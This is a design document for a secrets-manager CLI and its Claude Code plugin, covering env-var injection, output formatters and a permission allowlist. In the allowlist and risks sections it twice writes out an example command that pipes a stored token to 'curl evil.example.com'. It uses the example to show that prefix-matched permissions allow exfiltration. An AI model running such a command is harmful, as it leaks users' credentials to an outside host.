# tsm — Agent Integration (Plan 3 design)

Design document for `tsm run`, `tsm get --format`, and the Claude Code plugin. Replaces the "MCP server / `tsm schema` / Claude Code plugin" sketch in the original design doc with a smaller, CLI-first scope informed by `docs/claude-code-integration.md`.

## Problem

The original design (`2026-03-08-tsm-design.md`) anticipated an MCP server (`tsm mcp`) plus a `tsm schema` introspection command as the agent integration story. Two things changed that thinking:

1. **Claude Code already invokes Bash tools natively.** A skill that teaches the agent to use the existing `tsm` CLI gives it everything an MCP server would have — `vault_list` becomes `tsm list --json`, `vault_get` becomes `tsm get <name> --raw`, `vault_status` becomes `tsm status --json`. No new protocol surface, no `tsm schema` to maintain.

2. **The real friction is not "how does the agent talk to tsm" — it is "how does tsm hand secrets to the tools the agent invokes."** `docs/claude-code-integration.md` enumerates the patterns: AWS reads from a credential file format, `psql` from `PGPASSFILE`, `gh` from `GITHUB_TOKEN`, MCP servers from env vars in `.mcp.json`. Each has its own wire format. Without a way to bridge them, the skill ends up listing per-tool recipes that go stale.

This plan fills that gap with two CLI primitives (`tsm run` for env-var injection, `tsm get --format` for wire-format reshaping) and a Claude Code plugin (manifest + hook + skill + permission allowlist) that ties them together.

`tsm mcp` and `tsm schema` are dropped from the roadmap. If a non-Claude-Code MCP user needs them later, `tsm mcp` can be added as a thin shim over the existing CLI surface; we will design it then with real usage data.

## Scope

In scope:
- `tsm run --env VAR=secret -- <command>` — env-var injection wrapper for subprocess invocation.
- `tsm get --format <name>` — output formatters for tools that demand specific wire formats.
- Claude Code plugin at `plugin/` in this repo: manifest, `SessionStart` hook, opinionated skill, read-only permission allowlist.

Out of scope (deferred to future plans):
- `tsm run --recipe <name>` — named bundles (e.g., `--recipe gh`). YAGNI for v1; explicit `--env` covers it. Real usage will tell us which recipes pay rent.
- Structured / multi-field secrets (gap doc #3). Defer per the gap doc; flat-secret + formatter covers most cases.
- `tsm import` recipes (gap doc #4). Per-source work (aws, gh, pgpass, env-file) deserves its own plan.
- gcloud user-OAuth — explicitly out of scope per gap doc.
- User-defined formatters — out of scope per gap doc §2.
- `tsm mcp`, `tsm schema`, `tsm update` — `mcp`/`schema` dropped (see Problem); `update` is release-engineering work, separate plan.

## Architecture

### Component changes

| Area | Change |
|---|---|
| `tsmd` (Swift daemon) | **No change.** `vault.get` already returns values and handles `confirm`-gated Touch ID. Plan 3 is pure CLI + plugin work. |
| `cmd/run.go` | New cobra subcommand. |
| `cmd/get.go` | Adds `--format <name>` flag, with `--export` modifier for `env` formatter. |
| `internal/format/` | New package. `Formatter` interface + built-in registry (`env`, `aws-credential-process`, `pgpass`). |
| `internal/runspec/` | New package. Parses `--env VAR=name` flags into validated mappings. |
| `plugin/` | New top-level dir. Plugin manifest, hook, skill, settings. |
| `docs/plans/2026-04-25-tsm-agent-integration-impl.md` | Implementation plan (written by writing-plans skill, not this doc). |

No daemon protocol changes. No vault format changes. No Keychain changes. The blast radius is intentionally small — Plan 3 ships without a `tsmd` redeploy.

### Why no daemon changes

Both new primitives sit on top of the existing `vault.get` JSON-RPC method:
- `tsm run` resolves each `--env VAR=secret` mapping by calling `vault.get` for `secret`, then `setenv`/`execve`.
- `tsm get --format` calls `vault.get` and runs the value through a formatter before writing stdout.

The daemon already logs `vault.get` calls to the access log, so no additional audit-side work is needed.

## `tsm run`

### Command surface

```
tsm run --env VAR=secret-name [--env VAR2=secret2 ...] -- <command> [args...]
```

- `--env` is repeatable; format is `VAR=secret-name`.
- `VAR` validated as `^[A-Z_][A-Z0-9_]*$` (POSIX env var name).
- `secret-name` validated against the existing kebab-case rule (`^[a-zA-Z0-9_-]{1,128}$`).
- Duplicate `VAR` across `--env` flags is rejected.
- The same secret may appear under multiple `VAR`s (e.g., `--env GITHUB_TOKEN=gh-pat --env GH_TOKEN=gh-pat`); this is allowed and only triggers one `vault.get` call (deduplicated by secret name).
- `--` separator required to separate `tsm run`'s own flags from the target command.

### Behavior

1. Parse `--env` flags into `[]Mapping{VAR, SecretName}`. On any parse error, exit 2 with usage error.
2. `withUnlockedClient` (existing helper): trigger Touch ID for vault unlock if needed, **before** any `vault.get` calls. This gives the user one upfront prompt instead of one per secret.
3. For each unique secret name, call `vault.get`. Sequential, not concurrent — `confirm: true` secrets each trigger their own Touch ID prompt, and overlapping prompts would confuse the user.
4. On any `vault.get` failure (not found, confirm rejected, etc.), exit non-zero before touching the child. Never partially leak: if 3 of 4 secrets resolved, none get exported.
5. Resolve absolute path of target via `exec.LookPath`. If not found, exit 127 (POSIX convention).
6. `setenv` each `VAR=value` in the current process's environment.
7. `syscall.Exec` (`golang.org/x/sys/unix.Exec`) the target. This replaces the `tsm` process; the child inherits stdio; `tsm` is gone from the process tree. The child's exit code becomes the visible exit code.

### Confirm + non-TTY refusal

If any requested secret has `confirm: true` and stdin is not a TTY, `tsm run` refuses with exit 5 and a message naming the offending secret(s). Rationale: a non-interactive caller (CI, batch script) cannot meaningfully respond to a Touch ID dialog, and a hung Touch ID prompt is worse than a clear refusal.

There is **no override flag** for this. If a workflow legitimately needs the secret without interactive auth, the user should change the secret's `confirm` setting via `tsm edit` — that is a deliberate decision, not a CLI flag.

### Exit codes

| Code | Reason |
|---|---|
| 0 | (Cannot be returned by `tsm run` itself — the child's exit code replaces ours via execve.) |
| 2 | Flag parse error (bad `VAR` name, missing `=`, duplicate `VAR`, missing `--`) |
| 3 | Secret not found |
| 4 | Vault locked and unlock failed |
| 5 | Confirm-required secret + non-TTY stdin |
| 127 | Target command not found / not executable |
| (child's exit code) | Target ran; its exit code is preserved by execve |

### Audit

Each `vault.get` call is logged by the daemon as it is today. `tsm run` does not add tsm-side audit beyond what the daemon already records. The daemon's `client_id` field captures the calling process; `tsm run` sets `client_id = "tsm-run/pid:<pid-of-tsm>"` so the access log shows `tsm run` as the originator.

## `tsm get --format`

### Command surface

```
tsm get <name> --format <formatter> [--export]
```

`--format` is mutually exclusive with `--raw`, `--to-file`, and `--json`. (Default `tsm get` output is JSON; specifying `--format` swaps the output shape.)

### Built-in formatters

| Formatter | Output | Validation |
|---|---|---|
| `env VAR` | `VAR=value\n` (or `export VAR=value\n` with `--export`) | `VAR` must match `^[A-Z_][A-Z0-9_]*$` |
| `aws-credential-process` | The stored value, verbatim, after validation | Parse value as JSON; require keys `Version`, `AccessKeyId`, `SecretAccessKey`. Reject otherwise with guidance on shape. |
| `pgpass` | The stored value, verbatim, after validation | Reject if value contains a newline or does not have exactly 5 colon-delimited fields |

The `env` formatter takes its `VAR` argument inline: `tsm get gh-pat --format "env GITHUB_TOKEN"`. Other formatters take no arguments.

### TTY refusal

If stdout is a TTY, `tsm get --format` refuses with the same message `tsm get --raw` uses today. Formatter output may still contain the secret value; protecting against accidental scrollback exposure applies equally.

### Internal architecture

```go
package format

type Formatter interface {
    Format(value string, args []string) ([]byte, error)
}

var registry = map[string]Formatter{}

func Register(name string, f Formatter) { registry[name] = f }
func Get(name string) (Formatter, bool) { f, ok := registry[name]; return f, ok }
```

One file per formatter (`env.go`, `aws_credential_process.go`, `pgpass.go`); each registers itself in `init()`. Adding a future formatter is a one-file change.

## Claude Code plugin

### Layout

```
plugin/
  .claude-plugin/
    plugin.json              # name, version, description, author
  hooks/
    hooks.json               # SessionStart -> tsm ensure-daemon
  skills/
    credential-usage/
      SKILL.md               # opinionated skill (see below)
  settings.json              # plugin-scoped permission allowlist
```

### `.claude-plugin/plugin.json`

```json
{
  "name": "tsm",
  "version": "0.1.0",
  "description": "Touch-ID-gated secrets for AI coding agents. Provides safe credential injection for tools and MCP servers.",
  "author": "Carl Tashian"
}
```

### `hooks/hooks.json`

```json
{
  "hooks": {
    "SessionStart": [{
      "matcher": "startup",
      "hooks": [{
        "type": "command",
        "command": "tsm ensure-daemon"
      }]
    }]
  }
}
```

`tsm ensure-daemon` only spawns the daemon process if it isn't already running. It does **not** unlock the vault. The first `tsm get`/`tsm run` call triggers Touch ID if needed. This avoids prompting the user at every session start.

### `settings.json` (plugin-scoped permission allowlist)

```json
{
  "permissions": {
    "allow": [
      "Bash(tsm list)",
      "Bash(tsm list:*)",
      "Bash(tsm status)",
      "Bash(tsm status:*)",
      "Bash(tsm get:*)",
      "Bash(tsm run:*)",
      "Bash(tsm log)",
      "Bash(tsm log:*)",
      "Bash(tsm ensure-daemon)",
      "Bash(tsm lock)",
      "Bash(tsm unlock)"
    ]
  }
}
```

Deliberately NOT in the allowlist: `tsm add`, `tsm edit`, `tsm remove`, `tsm reset`, `tsm init`, `tsm config set`. Mutations and lifecycle commands always require explicit per-call user approval. Rationale: per the brainstorming discussion, an agent that can write to the vault is one prompt-injection away from poisoning it. `tsm remove`/`reset` are excluded specifically because the Touch ID dialog cannot surface *what* is being deleted — the user can't meaningfully review the action through the prompt alone.

`tsm unlock` *is* allowed: it is a pure authorization gate, not a mutation. The daemon enforces Touch ID for it identically to `vault.get`, so the trust model is unchanged whether the agent or the user initiates it. Letting the agent unlock proactively avoids an awkward first-call delay at the start of a workflow.

The allowlist is a friction-reducer, not a security boundary. The security boundary is the daemon + Touch ID. Even if an agent invokes `tsm get gh-pat --raw && curl evil.example.com -d @-`, the prefix-matching allowlist still permits it. Defending against that is out of scope for this plan; the trust model is "the agent is not actively malicious, but you don't want it leaking secrets through carelessness."

### `skills/credential-usage/SKILL.md`

Frontmatter:

```yaml
---
name: credential-usage
description: Use whenever a task requires an API key, token, password, or other credential. Checks the local tsm vault first; teaches safe retrieval patterns by tool category.
---
```

Body, structured per `claude-code-integration.md` §5 ("Claude Code skill"):

1. **Discovery first.** Run `tsm list --json` before asking the user for a credential. If a matching secret exists by name, description, or tag, use it.
2. **Pattern by tool category:**
   - **MCP server credentials** → wrap the server in `tsm run` in `.mcp.json`:
     ```json
     {"command": "tsm", "args": ["run", "--env", "GITHUB_TOKEN=gh-pat", "--", "github-mcp-server"]}
     ```
   - **Env-var CLI tools** (`gh`, `openai`, `anthropic`, `aws`) → `tsm run --env VAR=name -- <cmd>` for repeated invocations; `$(tsm get name --raw)` in a subshell for one-off calls.
   - **File-flag tools** (`curl --cacert`, `psql --pgpass`, `gcloud --key-file`) → process substitution `<(tsm get name --raw)`, or `--to-file /dev/shm/...` if the tool re-reads the file later (process substitution closes the FD after the first read).
   - **Wire-format-specific tools** (AWS `credential_process`, Postgres pgpass file) → `tsm get name --format <formatter>` writes the canonical wire format.
3. **Confirm-gated secrets.** When `tsm list --json` shows `"confirm": true` on a secret you plan to use, warn the user before invoking that Touch ID will prompt.
4. **Never:**
   - Echo, print, log, or include the secret value in your output to the user.
   - Write secrets to `.env`, `.envrc`, or any file outside `/tmp` or `/dev/shm`.
   - Pass secrets as `--value`-style flags. (`tsm add --value` does not exist; this is reinforcement for other tools too.)
   - Run `tsm add`/`edit`/`remove` (not in the plugin allowlist; these are user-driven via the TUI).

The full skill prose is written during implementation; the structure above is the contract.

## Data flow

### `tsm run` invocation

```
Agent (via Bash tool)
  └─> tsm run --env GITHUB_TOKEN=gh-pat --env LINEAR=linear-key -- gh pr list
        ├─> parse --env → [{GITHUB_TOKEN, gh-pat}, {LINEAR, linear-key}]
        ├─> withUnlockedClient → vault.unlock (Touch ID if needed)
        ├─> vault.get gh-pat → "ghp_..."
        ├─> vault.get linear-key → "lin_..."
        ├─> setenv GITHUB_TOKEN, LINEAR
        └─> execve(/usr/local/bin/gh, ["gh", "pr", "list"])
              └─> gh process inherits env, runs, exits with code N
                    └─> shell sees exit code N (tsm is gone)
```

### `tsm get --format env` invocation

```
Agent (via Bash tool)
  └─> tsm get gh-pat --format "env GITHUB_TOKEN" >> /tmp/envfile
        ├─> withUnlockedClient → vault.unlock (Touch ID if needed)
        ├─> vault.get gh-pat → "ghp_..."
        ├─> format.Get("env").Format("ghp_...", ["GITHUB_TOKEN"]) → "GITHUB_TOKEN=ghp_...\n"
        └─> stdout (TTY-refused; safe to redirect)
```

## Error handling

Neither `tsm run` nor `tsm get --format` carries a `--json` flag (the latter because `--format` is mutually exclusive with `--json`). Errors are written human-readable to stderr; the exit code (see `tsm run` exit-code table) is the machine-readable signal.

For agent consumption, the skill teaches recognition by exit code, not by parsing stderr text. Example messages the user (and agent) will see:

```
tsm run: no secret named 'gh-pat' (run 'tsm list' to see available)             # exit 3
tsm run: secret 'aws-prod' requires confirmation but stdin is not a TTY          # exit 5
tsm run: command 'gh' not found in PATH                                          # exit 127
```

Stderr messages are stable enough to grep against if needed, but exit codes are the contract.

## Testing

| Layer | Approach |
|---|---|
| `internal/format/` | Pure table-driven Go tests per formatter. Round-trip valid inputs; reject invalid inputs with the documented error shape. |
| `internal/runspec/` | Pure parser tests. Good and bad `--env` strings, duplicate detection, name validation. |
| `cmd/run` | Integration tests against a mock `client.Caller`. Cover: success path, missing secret, vault locked, confirm + non-TTY refusal, exit codes. `syscall.Exec` is wrapped in a `runner` function type and injected; production uses the real `unix.Exec`, tests use a recording fake. |
| `cmd/get --format` | Smoke tests for formatter dispatch, mutually-exclusive flag rejection, TTY refusal. |
| Plugin | Manual smoke checklist in the implementation plan. Install plugin into a sandbox Claude Code project, verify hook fires, verify allowlist suppresses prompts for `tsm list`/`get`/`run`, verify skill triggers on a credential task. No automated plugin test framework today. |

## Risks and mitigations

| Risk | Mitigation |
|---|---|
| `syscall.Exec` skips Go's deferred cleanup. If `cmd/run` holds resources (open sockets, temp files), they leak. | Explicitly close the daemon socket before exec; do not allocate any temp files in the run path. Verify in code review. |
| Permission allowlist patterns are prefix-matched by Claude Code. `Bash(tsm get:*)` matches `tsm get foo && curl evil.example.com -d @-`. | Document that the allowlist is a convenience, not a security boundary. The real boundary is the daemon + Touch ID. |
| Skill staleness as `tsm` evolves (new flags, renamed commands). | Skill lives in this repo alongside the CLI. PRs that change CLI surface must update the skill in the same commit. Add a CLAUDE.md note. |
| `aws-credential-process` formatter passes the value verbatim after validation. If the user stores a malformed AWS JSON blob, validation catches it on read, not on write. | Future improvement: validate on `tsm add` when `--for aws-credential-process` is provided. Out of scope for v1. |
| The agent might invoke `tsm run` with secrets it doesn't actually need (over-fetching). | Daemon access log captures every `vault.get`. User can audit. Skill text says "use the smallest set of secrets needed for the call." |

## Open questions

None blocking. Items the implementation plan should re-examine if they become awkward in code:

1. Whether `tsm run`'s `client_id` should be `tsm-run/pid:<pid>` or include the target command name (e.g., `tsm-run/pid:1234/gh`). Including the command improves audit log readability but couples the audit format to user-supplied input. My lean: `pid` only; the target is incidental.
2. Whether `--export` is the right name for the `env` formatter modifier, or if a separate formatter `env-export` is clearer. My lean: keep `--export`; it composes naturally and doesn't require a second registry entry.

## Non-goals (restated)

- **`tsm mcp` server mode.** Dropped. Claude Code uses Bash tools natively; the CLI is the integration surface.
- **`tsm schema`.** Dropped along with `tsm mcp` (its only consumer).
- **`tsm update`.** Release-engineering work; separate plan.
- **`tsm import`** (gap doc #4). Separate plan; per-source work merits its own design.
- **Structured/multi-field secrets** (gap doc #3). Defer per gap doc.
- **`--recipe` shorthand** on `tsm run`. YAGNI for v1; add when real usage shows it pays rent.
- **gcloud user-OAuth integration.** Out of scope per gap doc.
- **User-defined formatters.** Out of scope per gap doc.

## References

- `docs/plans/2026-03-08-tsm-design.md` — original design (this doc supersedes its "MCP Interface" and "Claude Code Plugin" sections).
- `docs/claude-code-integration.md` — gap analysis that drove the scope of this plan.
- `op run` (1Password) — model for `--env VAR=secret` injection.
- `aws-vault exec` — same pattern, AWS-specific.
- AWS `credential_process` — wire format for `--format aws-credential-process`.
- PostgreSQL pgpass — wire format for `--format pgpass`.
